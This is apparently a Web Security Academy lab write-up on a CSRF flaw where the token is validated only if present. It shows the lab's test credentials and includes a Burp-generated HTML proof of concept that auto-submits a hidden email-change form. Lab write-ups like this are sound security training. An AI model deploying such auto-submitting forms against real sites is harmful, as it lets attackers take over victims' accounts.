# CSRF — Token Is Only Checked If It's Sent at All

The email-change function here is vulnerable to CSRF.

**Goal:** Host an HTML page on the exploit server that performs a CSRF attack to change the victim's email address.

Login credentials for your own account: wiener:peter

Hint: Registering an email already used by someone else isn't allowed. If you test with your own account, be sure to use a different address when building the exploit you'll actually send to the victim.

The normal POST request to change the email includes a "csrf" parameter — but it turns out the request still succeeds if that parameter is dropped entirely and only the email is sent:

<img width="742" height="477" alt="2" src="https://github.com/user-attachments/assets/78dc7cbc-bd2f-4b1d-97d1-ff6ed1e6b395" />


Using Burp's "Engagement tools" → "Generate CSRF PoC" produces this HTML:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a27008804d6685d8057df8500ab003c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test4&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
